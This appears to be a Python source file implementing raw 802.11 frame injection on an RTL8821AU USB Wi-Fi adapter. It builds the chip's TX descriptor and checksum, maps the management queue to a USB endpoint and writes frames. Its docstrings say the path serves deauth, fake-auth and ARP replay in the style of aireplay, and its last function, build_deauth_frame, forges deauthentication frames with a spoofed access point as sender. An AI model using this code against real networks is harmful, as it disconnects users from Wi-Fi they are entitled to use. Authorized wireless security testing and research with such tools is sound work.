"""RTL8821AU TX path: 40-byte tx_pkt_desc builder + bulk-OUT writer.

Port of `rtw_tx_fill_tx_desc` (tx.c:35) + `fill_txdesc_checksum_common`
(tx.c:119) for the 8821A path (tx_pkt_desc_sz=40, 16-word checksum).

For raw frame injection we drive the MGMT queue, which:

  * sets qsel = TX_DESC_QSEL_MGMT (18)
  * uses a fixed low rate (DESC_RATE1M at 2.4 GHz)
  * disables HW queue/seq sequencing (`dis_qselseq=1`, `en_hwseq=1`)
  * sets `bmc` based on the 802.11 frame's addr1
  * sets the LS (last-segment) bit

The bulk-OUT endpoint is selected by mapping the queue (MGMT) through
the RQPN table for our bulk-OUT count, then through PyUSB descriptor
order. See :func:`pick_bulk_out_ep` for the lookup.

References:
    tx.h:25..82   bit layouts
    tx.c:35       rtw_tx_fill_tx_desc
    tx.c:119      fill_txdesc_checksum_common
    tx.c:273      rtw_tx_pkt_info_update_rate (2.4 GHz → RATEID_B_20M)
    tx.c:319      rtw_tx_mgmt_pkt_info_update
    usb.c:222     dma_mapping_to_ep
"""
from __future__ import annotations

import logging
import struct
from typing import List

import usb.core

from .constants import (
    DESC_RATE1M,
    RTW_DMA_MAPPING_EXTRA,
    RTW_DMA_MAPPING_HIGH,
    RTW_DMA_MAPPING_LOW,
    RTW_DMA_MAPPING_NORMAL,
)

logger = logging.getLogger(__name__)

TX_PKT_DESC_SZ = 40       # 8821A chip param
TX_CHECKSUM_WORDS = 16    # XOR'd u16s for the checksum (covers bytes 0..31)

# Queue-select values (tx.h:62)
TX_DESC_QSEL_BEACON = 16
TX_DESC_QSEL_HIGH = 17
TX_DESC_QSEL_MGMT = 18
TX_DESC_QSEL_H2C = 19

# Rate-ID enum (main.h:237)
RTW_RATEID_B_20M = 8
RTW_RATEID_G = 7


def _is_multicast_or_broadcast(addr: bytes) -> bool:
    """802.11 broadcast/multicast tell: addr1[0] has the I/G bit set."""
    return bool(addr[0] & 0x01)


def build_tx_desc_mgmt(mpdu: bytes, *, band_is_2g: bool = True,
                       retry_limit: int | None = None) -> bytes:
    """Build the 40-byte tx_pkt_desc for MGMT-queue injection.

    Mirrors the fields set by `rtw_tx_rsvd_page_pkt_info_update` + the mgmt
    rate path in `rtw_tx_pkt_info_update_rate` (2.4 GHz). The hardware assigns
    the 802.11 sequence number (W8 EN_HWSEQ set, tx.c:81). Used by deauth,
    fake-auth, and ARP replay — all unfragmented, so the seq number is
    irrelevant. W8/W9 sit past the checksummed region (words 0..7).

    ``retry_limit`` (when not None) caps the HW ACK-retry count via RTY_LMT_EN (W4[17]) plus
    the 6-bit DATA_RT_LMT (W4[18:24]) — the same 8821a descriptor bits the DKMS sibling
    byte-verifies against the recorded aireplay TX. The inject path leaves ``retry_limit`` None,
    so the field stays clear and the HW global retry applies.
    """
    if len(mpdu) < 10:
        raise ValueError(f"MPDU too short ({len(mpdu)} bytes) for mgmt injection")

    pkt_size = len(mpdu) & 0xFFFF
    bmc = _is_multicast_or_broadcast(mpdu[4:10])    # addr1 = bytes 4..10

    if band_is_2g:
        rate = DESC_RATE1M
        rate_id = RTW_RATEID_B_20M
    else:
        rate = 4  # DESC_RATE6M
        rate_id = RTW_RATEID_G

    qsel = TX_DESC_QSEL_MGMT

    # 10 u32 words = 40 bytes, all LE.
    w0 = (
        (pkt_size & 0xFFFF)                # W0[15:0]   TXPKTSIZE
        | ((TX_PKT_DESC_SZ & 0xFF) << 16)  # W0[23:16]  OFFSET
        | ((1 if bmc else 0) << 24)        # W0[24]     BMC
        | (1 << 26)                        # W0[26]     LS (last segment)
        | (1 << 31)                        # W0[31]     DISQSELSEQ
    )

    w1 = (
        0                                  # W1[7:0]    MACID = 0
        | ((qsel & 0x1F) << 8)             # W1[12:8]   QSEL
        | ((rate_id & 0x1F) << 16)         # W1[20:16]  RATE_ID
        | (0 << 22)                        # W1[23:22]  SEC_TYPE (0 = open)
        | (0 << 24)                        # W1[28:24]  PKT_OFFSET = 0
    )

    w2 = 0
    w3 = (
        (1 << 8)                           # W3[8]      USE_RATE
        | (1 << 10)                        # W3[10]     DISDATAFB
    )

    w4 = (rate & 0x7F)                     # W4[6:0]    DATARATE
    # 8821a has old_datarate_fb_limit=True (rtw8821a.c:1188) → set FB_LIMIT=0x1f
    w4 |= (0x1F & 0x1F) << 8               # W4[12:8]   DATARATE_FB_LIMIT
    if retry_limit is not None:
        w4 |= (1 << 17)                    # W4[17]     RTY_LMT_EN
        w4 |= (retry_limit & 0x3F) << 18   # W4[18:24]  DATA_RT_LMT (HW ACK-retry cap)

    w5 = 0
    w6 = 0
    w7 = 0                                 # filled by checksum below
    w8 = (1 << 15)                         # W8[15]     EN_HWSEQ — HW assigns seq
    w9 = 0

    desc = bytearray(struct.pack("<10I", w0, w1, w2, w3, w4, w5, w6, w7, w8, w9))

    # Checksum: XOR the first 16 u16 (32 bytes) then drop into W7[15:0].
    chksum = 0
    for i in range(TX_CHECKSUM_WORDS):
        chksum ^= struct.unpack_from("<H", desc, i * 2)[0]
    struct.pack_into("<H", desc, 7 * 4, chksum & 0xFFFF)

    return bytes(desc)


def pick_bulk_out_ep(out_ep_addrs: List[int], queue: int = TX_DESC_QSEL_MGMT) -> int:
    """Map a logical queue → physical bulk-OUT endpoint address.

    The kernel does this via rqpn_table[bulkout_num] → dma_mapping_to_ep
    (usb.c:222). For the 8821A 4-bulk-out USB layout (which our
    AWUS036ACS exposes) the relevant lanes are:

        MGMT  → dma_map_mg = NORMAL = ep_index 1
        HIGH  → dma_map_hi = HIGH   = ep_index 0
        BEACON→ dma_map_hi = HIGH   = ep_index 0

    `out_ep_addrs` is the list of bulk-OUT endpoint addresses in
    descriptor order; AWUS036ACS reports `[0x05, 0x06, 0x08, 0x09]`
    so MGMT → 0x06.
    """
    # (queue, dma_mapping) for the lanes we care about.
    mapping = {
        TX_DESC_QSEL_BEACON: RTW_DMA_MAPPING_HIGH,
        TX_DESC_QSEL_HIGH:   RTW_DMA_MAPPING_HIGH,
        TX_DESC_QSEL_MGMT:   RTW_DMA_MAPPING_NORMAL,
        TX_DESC_QSEL_H2C:    RTW_DMA_MAPPING_HIGH,
    }
    dma = mapping.get(queue, RTW_DMA_MAPPING_NORMAL)
    # dma → ep_index per dma_mapping_to_ep (usb.c:222)
    dma_to_idx = {
        RTW_DMA_MAPPING_HIGH:   0,
        RTW_DMA_MAPPING_NORMAL: 1,
        RTW_DMA_MAPPING_LOW:    2,
        RTW_DMA_MAPPING_EXTRA:  3,
    }
    idx = dma_to_idx[dma]
    if idx >= len(out_ep_addrs):
        # Fall back to the first available bulk-OUT.
        logger.warning(
            "queue %d wants out_ep[%d] but only %d bulk-OUTs exist; "
            "falling back to out_ep[0]=0x%02x",
            queue, idx, len(out_ep_addrs), out_ep_addrs[0],
        )
        return out_ep_addrs[0]
    return out_ep_addrs[idx]


def write_bulk(dev: usb.core.Device, ep: int, payload: bytes, *,
               timeout_ms: int = 200) -> int:
    """Single bulk-OUT write. Returns bytes written."""
    sent = dev.write(ep, payload, timeout_ms)
    return int(sent)


def build_deauth_frame(ap_mac: bytes, client_mac: bytes,
                       *, reason: int = 7) -> bytes:
    """Construct a raw 802.11 deauth frame.

    Frame Control: 0xC0 0x00 (subtype=12 deauth, type=mgmt). Duration=0,
    seq=0 (HW fills). Reason 7 = "Class 3 frame from nonassoc STA".
    """
    fc = b"\xC0\x00"
    dur = b"\x00\x00"
    seq = b"\x00\x00"
    reason_bytes = struct.pack("<H", reason)
    # Addr1=dest, Addr2=source, Addr3=BSSID. For "client deauth" the AP
    # is spoofed as source/BSSID and the client is the destination.
    return fc + dur + client_mac + ap_mac + ap_mac + seq + reason_bytes
